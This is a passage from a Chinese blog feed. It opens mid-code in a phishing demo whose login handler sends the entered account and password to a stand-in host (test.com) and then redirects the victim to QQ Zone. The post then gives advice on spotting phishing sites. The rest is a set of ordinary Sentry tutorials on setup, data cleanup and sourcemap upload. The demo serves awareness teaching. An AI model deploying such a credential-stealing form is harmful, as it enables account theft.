class="line">    <span class="keyword">var</span> account = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;inputAccount&quot;</span>).<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">var</span> password = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;inputPassword&quot;</span>).<span class="property">value</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;账号:&quot;</span> + account, <span class="string">&quot;密码:&quot;</span> + password);</span><br><span class="line">    $.<span class="title function_">get</span>(<span class="string">&quot;http://www.test.com/?name=&quot;</span> + account + <span class="string">&quot;&amp;password=&quot;</span> + password);</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&quot;https://qzone.qq.com/&quot;</span>;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>结果：<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913275517-279c1ae7-54b5-478d-8bcd-89352677e134.png#height=286&id=aHCw4&originHeight=286&originWidth=706&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19949&status=done&style=none&title=&width=706" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913275517-279c1ae7-54b5-478d-8bcd-89352677e134.png#height=286&id=aHCw4&originHeight=286&originWidth=706&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19949&status=done&style=none&title=&width=706" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="结果.png"></p><p>假如<code>http://www.test.com/</code>真实存在，那么该次盗取攻击已经成功执行了。</p><p><a name="f7105156"></a></p><h3 id="攻击发生及成功的原因"><a href="#攻击发生及成功的原因" class="headerlink" title="攻击发生及成功的原因"></a>攻击发生及成功的原因</h3><p>攻击者多数是抱着从中获利的心态，利用人类的贪婪、恐惧、信任、善良等情感诱骗被攻击者。例如，人们在收到巨额中将信息时，内心的贪欲可能战胜了理智，从而跟随攻击者的指引，一步一步陷入深渊，最终在攻击者仿造的某银行登录页面上泄露银行账户以及密码，造成损失。<br /><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/1787397/1594913283391-c5b9804c-babf-4b67-9788-799b46327315.jpeg#height=123&id=ltGTD&originHeight=123&originWidth=400&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17470&status=done&style=none&title=&width=400" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/jpeg/1787397/1594913283391-c5b9804c-babf-4b67-9788-799b46327315.jpeg#height=123&id=ltGTD&originHeight=123&originWidth=400&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17470&status=done&style=none&title=&width=400" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="短信.jpeg"></p><p><a name="48fb2cd0"></a></p><h4 id="防范办法"><a href="#防范办法" class="headerlink" title="防范办法"></a>防范办法</h4><ul><li><strong>查验“可信网站”</strong>   正规经营的网站一般情况下在中国互联网信息中心（CNNIC）存有备案信息，备案信息对应着一个编号，通常情况下该编号存在于网站首页的底部，对应着一个连接，点击会跳转至该网站的经营许可证，格式如“<a href="http://www.qq.com/culture.shtml">粤网文[2017]6138-1456 号</a>”</li><li><strong>核对网站域名</strong>   无论网站首页如何相似，域名是不可能相同的。通过这点我们就可以辨别当前访问的网站是否是正规网站。</li><li><strong>查询网站备案</strong>   通过 ICP 备案可以查询网站的基本情况、网站拥有者的情况，对于没有合法备案的非经营性网站或没有取得 ICP 许可证的经营性网站，根据网站性质，将予以罚款，严重的关闭网站 。</li><li><strong>查看安全证书</strong>   大型的电子商务网站都应用了可信证书类产品，这类的网站网址都是“https”开头的，如果发现不是“https”开头，应谨慎对待。</li></ul><p><a name="6de48d87"></a></p><h3 id="反钓鱼联盟"><a href="#反钓鱼联盟" class="headerlink" title="反钓鱼联盟"></a>反钓鱼联盟</h3><p>中国反钓鱼网站联盟成员单位包括：工商银行、农业银行、中国银行、建设银行、华夏银行、光大银行、银河证券、腾讯、淘宝、支付宝等几十家金融机构和电子商务网站，以及中国万网、中企动力、厦门中资源、厦门华商盛世、阿里巴巴、ChinaSpringboardInc.等国内主要的域名注册服务机构。“中国反钓鱼网站联盟”并非官方机构，它的成员包括了域名管理机构、注册服务机构，以及银行证券类、电子商务类、网络安全类等企业，目的就是为了发现和治理“钓鱼网站”，主要是针对假冒其成员单位的“钓鱼网站”。该联盟在接到涉及联盟成员的投诉后，权威技术鉴定机构会立即对其进行判定，一经认定，两个小时内暂停其域名解析，终止欺诈行为。从处理的及时性上大大降低了“钓鱼网站”所造成的危害  。</p><p><a name="9415a826"></a></p><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>最跟本的预防办法还是擦亮眼睛，不要轻信来历不明的信息，谨防电信诈骗。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sentry前端异常监控</title>
      <link href="/2023/06/28/frontend/monitor/sentry-qian-duan-yi-chang-jian-kong/"/>
      <url>/2023/06/28/frontend/monitor/sentry-qian-duan-yi-chang-jian-kong/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="df368884"></a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>起初神创造天地，天地处于一片混沌状态，神说，要有光，于是便有了光。———《圣经》</p><p><a name="a4d3b02a"></a></p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><code>Sentry</code>是一款国外的异常监控开源服务，名字翻译过来就是“哨兵”。<br />有没有感觉像《冰与火》里的守夜人，其实也差不多，把 bug 想成异鬼就行了。</p><p>对于任何一个项目而言，本地测试肯定做不到 100%覆盖，而且，我们也不能保证用户能按照我们的预期进行操作，其实对我而言，用户才是最好的测试者，但是我们不能奢求每个用户遇到问题时候都会主动向我们反馈。</p><p>故而，我们需要在项目出现异常时主动对其进行收集上报，分析原因和影响后制定下一步解决方案。<br><a name="224e2ccd"></a></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>1、首先访问官网<code>https://sentry.io</code>注册账号<br />2、创建项目<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/12776269/1631612536053-c118d16f-007e-4f9c-8e60-c59d65a8cd5d.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/12776269/1631612536053-c118d16f-007e-4f9c-8e60-c59d65a8cd5d.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>选择你用的前端框架<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/12776269/1631612542311-e50ebdd8-7d7f-419a-b02b-a5ebbf45d00f.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/12776269/1631612542311-e50ebdd8-7d7f-419a-b02b-a5ebbf45d00f.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//下面是vue的安装方式，其他框架安装指示做就可以了</span></span><br><span class="line"># <span class="title class_">Using</span> yarn</span><br><span class="line">yarn add @sentry/browser</span><br><span class="line">yarn add @sentry/integrations</span><br><span class="line"></span><br><span class="line"># <span class="title class_">Using</span> npm</span><br><span class="line">npm install @sentry/browser</span><br><span class="line">npm install @sentry/integrations</span><br></pre></td></tr></table></figure><p><code>注意下面的配置最好在 production 环境配置，否则会影响 debug</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.js配置</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> <span class="title class_">Sentry</span> <span class="keyword">from</span> <span class="string">&quot;@sentry/browser&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> <span class="title class_">Integrations</span> <span class="keyword">from</span> <span class="string">&quot;@sentry/integrations&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Sentry</span>.<span class="title function_">init</span>(&#123;</span><br><span class="line">  <span class="attr">dsn</span>: <span class="string">&quot;https://214bbc6a0a66455d********51357ef6@sentry.io/1827364&quot;</span>,</span><br><span class="line">  <span class="attr">integrations</span>: [<span class="keyword">new</span> <span class="title class_">Integrations</span>.<span class="title class_">Vue</span>(&#123; <span class="title class_">Vue</span>, <span class="attr">attachProps</span>: <span class="literal">true</span> &#125;)],</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><a name="433531fd"></a></p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p><a name="thQih"></a></p><h3 id="不同平台接入异常监控-Sentry-SDK"><a href="#不同平台接入异常监控-Sentry-SDK" class="headerlink" title="不同平台接入异常监控 Sentry SDK"></a>不同平台接入异常监控 Sentry SDK</h3><p>接入 SDK 这个再单独写成文章。或者也可以参考<a href="https://docs.sentry.io/error-reporting/quickstart/">接入文档</a><br /><a href="https://ask.dcloud.net.cn/question/139768">uniapp 接入 Sentry </a></p><p>最后奉上效果图<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/12776269/1631612550635-ea892848-8846-4ad9-9f40-7daf70cf6308.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/12776269/1631612550635-ea892848-8846-4ad9-9f40-7daf70cf6308.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>bug 复现步骤<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/12776269/1631612557670-9b4f9a7d-5098-4fb2-830c-74099dd7e654.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/12776269/1631612557670-9b4f9a7d-5098-4fb2-830c-74099dd7e654.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 监控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 监控 </tag>
            
            <tag> sentry </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sentry - 清理数据</title>
      <link href="/2023/06/28/frontend/monitor/sentry-qing-li-shu-ju/"/>
      <url>/2023/06/28/frontend/monitor/sentry-qing-li-shu-ju/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="oXHsn"></a></p><h2 id="一、SENTRY-数据软清理-（清理完不会释放磁盘，如果很长时间没有运行，清理时间会很长）"><a href="#一、SENTRY-数据软清理-（清理完不会释放磁盘，如果很长时间没有运行，清理时间会很长）" class="headerlink" title="一、SENTRY 数据软清理 （清理完不会释放磁盘，如果很长时间没有运行，清理时间会很长）"></a>一、SENTRY 数据软清理 （清理完不会释放磁盘，如果很长时间没有运行，清理时间会很长）</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 登陆 sentry_worker_1 容器</span></span><br><span class="line">$ docker <span class="built_in">exec</span> -it sentry_onpremise_worker_1 bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保留60天数据。cleanup的使用delete命令删除postgresql数据，但postgrdsql对于delete, update等操作，只是将对应行标志为DEAD，并没有真正释放磁盘空间</span></span><br><span class="line">$ sentry cleanup  --days 60</span><br></pre></td></tr></table></figure><p><a name="x64aQ"></a></p><h2 id="二、POSTGRES-数据清理-（清理完后会释放磁盘空间）"><a href="#二、POSTGRES-数据清理-（清理完后会释放磁盘空间）" class="headerlink" title="二、POSTGRES 数据清理 （清理完后会释放磁盘空间）"></a>二、POSTGRES 数据清理 （清理完后会释放磁盘空间）</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 登陆 sentry_onpremise_postgres_1 容器</span></span><br><span class="line">$ docker <span class="built_in">exec</span> -it sentry_onpremise_postgres_1 bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行清理</span></span><br><span class="line">$ vacuumdb -U postgres -d postgres -v -f --analyze</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a name="KKLFy"></a></p><h2 id="三、定时清理脚本"><a href="#三、定时清理脚本" class="headerlink" title="三、定时清理脚本"></a>三、定时清理脚本</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line">docker <span class="built_in">exec</span> -i sentry_worker_1 sentry cleanup --days 60 &amp;&amp;</span><br><span class="line">docker <span class="built_in">exec</span> -i -u postgres sentry_onpremise_postgres_1 vacuumdb -U postgres -d postgres -v -f --analyze</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 监控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 监控 </tag>
            
            <tag> sentry </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sentry - sourceMap</title>
      <link href="/2023/06/28/frontend/monitor/sentry-sourcemap/"/>
      <url>/2023/06/28/frontend/monitor/sentry-sourcemap/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="gd2sm"></a></p><h2 id="一、-基于-sentry-cli-上传"><a href="#一、-基于-sentry-cli-上传" class="headerlink" title="一、 基于 sentry-cli 上传"></a>一、 基于 sentry-cli 上传</h2><p><a name="r0vl6"></a></p><h4 id="第一步：安装-sentry-cli"><a href="#第一步：安装-sentry-cli" class="headerlink" title="第一步：安装 sentry-cli"></a>第一步：安装 sentry-cli</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">记得全局安装，这样方便点</span></span><br><span class="line">npm install @sentry/cli -g</span><br></pre></td></tr></table></figure><p><a name="ZZOOe"></a></p><h4 id="第二步：登陆-sentry-cli"><a href="#第二步：登陆-sentry-cli" class="headerlink" title="第二步：登陆 sentry-cli"></a><br />第二步：登陆 sentry-cli</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果你用的是官方版，不是自搭建的，可以直接 login</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">直接 login 其实就相当于：sentry-cli --url https://sentry.io/ login</span></span><br><span class="line">sentry-cli login</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果是公司或者自己自己搭建的sentry服务，则用这句话</span></span><br><span class="line">sentry-cli --url http://&#123;ip&#125;:9000/ login</span><br></pre></td></tr></table></figure><p>其中：</p><ul><li><code>--url</code> 表示是自己搭建的<strong>服务器网址</strong>，而不是官方登陆；</li><li>ip 改成自己的 ip 地址，端口同理；</li></ul><p><a name="UpZcz"></a></p><h4 id="第三步：输入-token询问是否需要帮你打开浏览器，开不开都行。接下来重点来了："><a href="#第三步：输入-token询问是否需要帮你打开浏览器，开不开都行。接下来重点来了：" class="headerlink" title="第三步：输入 token询问是否需要帮你打开浏览器，开不开都行。接下来重点来了："></a>第三步：输入 token<br />询问是否需要帮你打开浏览器，开不开都行。接下来重点来了：</h4><ul><li>找到我们第一步生成的 API key 令牌，粘贴进去；</li><li>还记得之前说要勾上读写权限吗？作用就在这里了。<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/216305/1622195089025-58dfdd5a-6477-4f1f-a7a7-7e751f681532.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/216305/1622195089025-58dfdd5a-6477-4f1f-a7a7-7e751f681532.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="WX20210528-174422.png"></li></ul><p><a name="wFlPr"></a></p><h4 id="第四步：修改配置信息根据-token-最后提示的保存位置，找到-sentryclirc。在默认情况下，url-和-org-是没有的，需要自己补一下，就是服务器地址和组织名称。这里的配置很重要，这涉及到上传-sourceMap-文件的验证。"><a href="#第四步：修改配置信息根据-token-最后提示的保存位置，找到-sentryclirc。在默认情况下，url-和-org-是没有的，需要自己补一下，就是服务器地址和组织名称。这里的配置很重要，这涉及到上传-sourceMap-文件的验证。" class="headerlink" title="第四步：修改配置信息根据 token 最后提示的保存位置，找到 .sentryclirc。在默认情况下，url 和 org 是没有的，需要自己补一下，就是服务器地址和组织名称。这里的配置很重要，这涉及到上传 sourceMap 文件的验证。"></a>第四步：修改配置信息<br />根据 token 最后提示的保存位置，找到 <code>.sentryclirc</code>。在默认情况下，url 和 org 是没有的，需要自己补一下，就是服务器地址和组织名称。这里的配置很重要，这涉及到上传 sourceMap 文件的验证。</h4><p><img src="https://cdn.nlark.com/yuque/0/2021/png/216305/1622195707779-afd3f2e6-621b-4bc7-84ab-f0bc76b1569b.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/216305/1622195707779-afd3f2e6-621b-4bc7-84ab-f0bc76b1569b.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p><strong>第五步：上传 sourceMap</strong><br />然后回到自己项目中，开始上传 sourceMap。命令如下：</p><blockquote><p>sentry-cli releases files v1.0.0 upload-sourcemaps ‘.&#x2F;dist&#x2F;js’ –url-prefix ‘~&#x2F;relx_demo&#x2F;js’</p></blockquote><p><br />参数说明：</p><ul><li><code>releases</code>：Sentry 通过 <code>releases</code> 来完成错误日志与 sourceMap 文件的匹配；</li><li><code>v1.0.0</code>: 代表 sourceMap 文件对应的版本；</li><li><code>./dist/js</code> ：这个是你本地项目 sourceMap 文件所在目录的文件；</li><li><code>--url-prefix</code> ：网页前缀。比如我们项目跑在 <code>http://xxx.com/relx_demo/#/</code>, 那我们的前缀就是<code>relx_demo</code>。我们需要访问<code>http://xxx.com/relx_demo/js</code> 才能找到对应的 JS 文件；</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2021/png/216305/1622204135473-e877b217-2b34-4209-9841-437895a6c8c7.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/216305/1622204135473-e877b217-2b34-4209-9841-437895a6c8c7.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>正常上传成功的提示如下：<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/216305/1622204206525-c07242db-c702-48d4-8174-841131319e8d.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/216305/1622204206525-c07242db-c702-48d4-8174-841131319e8d.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p><strong>注：</strong><br />像我司跑的中后台项目模板，上传命令如下：</p><blockquote><p>sentry-cli releases files 2.1.8 upload-sourcemaps –url-prefix ‘~&#x2F;‘ ‘.&#x2F;dist&#x2F;‘ –log-level&#x3D;debug</p></blockquote><p><a name="NlcH7"></a></p><h2 id="二、-基于-webpack-上传"><a href="#二、-基于-webpack-上传" class="headerlink" title="二、 基于 webpack 上传"></a>二、 基于 webpack 上传</h2><p><a name="P8Lni"></a></p><h4 id="第一步：安装插件"><a href="#第一步：安装插件" class="headerlink" title="第一步：安装插件"></a>第一步：安装插件</h4><p>安装 webpack 插件 <code>@sentry/webpack-plugin</code><br /><code>yarn add @sentry/webpack-plugin -D</code></p><p>PS: 反复安装不上的时候.可能需要翻墙</p><p><a name="z60Ea"></a></p><h4 id="第二步：添加-sentryclirc"><a href="#第二步：添加-sentryclirc" class="headerlink" title="第二步：添加.sentryclirc"></a>第二步：添加<code>.sentryclirc</code></h4><p>添加<code>.sentryclirc</code> 文件到项目<strong>根目录</strong>下，注意文件名称要写对。sentry 会自动检测并使用<code>.sentryclirc</code> 文件中的配置信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[defaults]</span><br><span class="line">project=zfz-fp</span><br><span class="line">org=zhifuzi</span><br><span class="line">url=http://sentry.xxxxx.com/</span><br><span class="line"></span><br><span class="line">[auth]</span><br><span class="line">token=xxxxxxxxxxx</span><br></pre></td></tr></table></figure><p>其中：</p><ul><li>参数<code>url</code>：sentry 上报错误日志的网址；</li><li>参数<code>project</code>：项目名称；</li><li>参数<code>token</code>：找到我们第一步生成的 API key(一定要有<code>**project:write**</code>权限)，复制粘贴进去即可；</li><li>参数<code>org</code>：项目所属的组织(注意：不是团队，是<strong>所属组织</strong>)；<br><a name="d3p7b"></a></li></ul><h4 id="第三步：修改-umi-配置"><a href="#第三步：修改-umi-配置" class="headerlink" title="第三步：修改 umi 配置"></a>第三步：修改 umi 配置</h4><p>在 umi 中借用 webpack 的 <code>webpack-chain</code> 的 API 修改 webpack 配置。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">SentryWebpackPlugin</span> <span class="keyword">from</span> <span class="string">&#x27;@sentry/webpack-plugin&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> defineConfig &#123;</span><br><span class="line">  <span class="attr">devtool</span>: <span class="string">&#x27;source-map&#x27;</span>,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 省略其他配置....</span></span><br><span class="line">  <span class="attr">chainWebpack</span>: <span class="keyword">function</span> (<span class="params">config, &#123; webpack &#125;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (process.<span class="property">env</span>.<span class="property">REACT_APP_ENV</span> === <span class="string">&#x27;prod&#x27;</span>) &#123;</span><br><span class="line">      config.<span class="title function_">plugin</span>(<span class="string">&#x27;sentry&#x27;</span>).<span class="title function_">use</span>(<span class="title class_">SentryWebpackPlugin</span>, [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">// sentry-cli configuration</span></span><br><span class="line">          <span class="attr">configFile</span>: <span class="string">&#x27;./sentryclirc&#x27;</span>,</span><br><span class="line">          <span class="attr">release</span>: <span class="string">&#x27;2.1.2&#x27;</span>,</span><br><span class="line">          <span class="comment">// TODO 添加文件前缀,上传时自动拼接在上传文件的前面 eg: /static/js/test.js</span></span><br><span class="line">          <span class="comment">// default: &#x27;~/&#x27;</span></span><br><span class="line">          <span class="attr">urlPrefix</span>: <span class="string">&#x27;~/finance.phone&#x27;</span>,</span><br><span class="line">          <span class="comment">// webpack specific configuration</span></span><br><span class="line">          <span class="attr">include</span>: <span class="string">&#x27;./dist&#x27;</span>,</span><br><span class="line">          <span class="attr">ignore</span>: [<span class="string">&#x27;node_modules&#x27;</span>, <span class="string">&#x27;config&#x27;</span>],</span><br><span class="line">        &#125;,</span><br><span class="line">      ])</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置说明：</p><ul><li>配置参数<code>configFile</code>：配置文件地址，这个一定要有；</li><li>配置参数<code>urlPrefix</code>：是线上 JS 的完整路径，必须<strong>设置正确</strong>，不然会看不到源码。<strong>重要！！！</strong></li><li>配置参数 <code>release</code>：版本号，要与项目的版本号做好一一对应；</li><li>配置参数 <code>include</code>：上传构建 bundle 文件的目录，此处是<code>./dist</code>目录；</li></ul><p><a name="Z6UIE"></a></p><h4 id="第四步：删除-sourcemap"><a href="#第四步：删除-sourcemap" class="headerlink" title="第四步：删除 sourcemap"></a>第四步：删除 sourcemap</h4><p>在完成 sourcemap 文件上传到 sentry 服务器后，还需将<strong>对应的 map 文件删除</strong>，避免根据 map 文件还原出相应源码。此处可以借助 npm 钩子来完成相应 map 文件的删除。<br />npm 提供了两种钩子，<code>pre</code>和<code>post</code>，分别代表操作前和操作后。比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;prebuild&quot;</span><br><span class="line">&quot;build&quot;</span><br><span class="line">&quot;postbuild&quot;</span><br></pre></td></tr></table></figure><p>当执行<code>npm run build</code>脚本，会按序执行<code>npm run prebuild &amp;&amp; npm run build &amp;&amp; npm run postbuild</code>。</p><p>在 <code>package.json</code> 中添加删除 map 文件脚本：<code>&quot;postbuild:prod&quot;: &quot;rimraf ./dist/**/*.js.map&quot;</code>，每当项目运行构建命令<code>npm run build:prod</code>完成项目后会自动删除相应的 map 文件。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">scripts<span class="string">&quot;: &#123;</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">  &quot;</span>postbuild<span class="punctuation">:</span>prod<span class="string">&quot;: &quot;</span>rimraf ./dist<span class="comment">/**/</span>*.js.map<span class="string">&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br></pre></td></tr></table></figure><p><a name="mlSgj"></a></p><h4 id="第五步：验证上传成功"><a href="#第五步：验证上传成功" class="headerlink" title="第五步：验证上传成功"></a>第五步：验证上传成功</h4><p>webpack 会有提示上传成功会有提示<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/192374/1632446658579-18eeb201-ac90-4a0e-be9e-82ee09d6038c.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/192374/1632446658579-18eeb201-ac90-4a0e-be9e-82ee09d6038c.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>或者 通过 【项目】 - 【设置（上传对应的项目中的设置）】 - 【source Maps】<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/192374/1632446796673-e344fdcc-ab34-453d-a4e5-61cc87ad817a.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/192374/1632446796673-e344fdcc-ab34-453d-a4e5-61cc87ad817a.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br><a name="MyEE7"></a></p><h2 id="三、-设置版本号"><a href="#三、-设置版本号" class="headerlink" title="三、 设置版本号"></a>三、 设置版本号</h2><p><a name="zWwyp"></a></p><h2 id="四、常见问题"><a href="#四、常见问题" class="headerlink" title="四、常见问题"></a>四、常见问题</h2><p><a name="mdr81"></a></p><h4 id="问题一：-工件-artifacts-为-0-的情况，可能是未上传成功"><a href="#问题一：-工件-artifacts-为-0-的情况，可能是未上传成功" class="headerlink" title="问题一： 工件(artifacts)为 0 的情况，可能是未上传成功"></a>问题一： 工件(artifacts)为 0 的情况，可能是未上传成功</h4><p>umi 中使用@sentry&#x2F;webpack-plugin 当出现错误时，不会进行报错（因为控制台被刷新掉了）<br />可以先使用 sentry-cli 方式上传尝试是否有报错。</p><p><a name="q8UcZ"></a></p><h4 id="问题二：souceMap-文件无法上传，系统报-413-错误。"><a href="#问题二：souceMap-文件无法上传，系统报-413-错误。" class="headerlink" title="问题二：souceMap 文件无法上传，系统报 413 错误。"></a>问题二：souceMap 文件无法上传，系统报 413 错误。</h4><p>造成这一问题的主要原因是 sourceMap 文件是通过 Nginx 服务转发到 sentry 服务器上的，Nginx 对文件上传有大小限制，针对这一问题，可以修改下 Nginx 配置即可，具体操作如下所示：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span 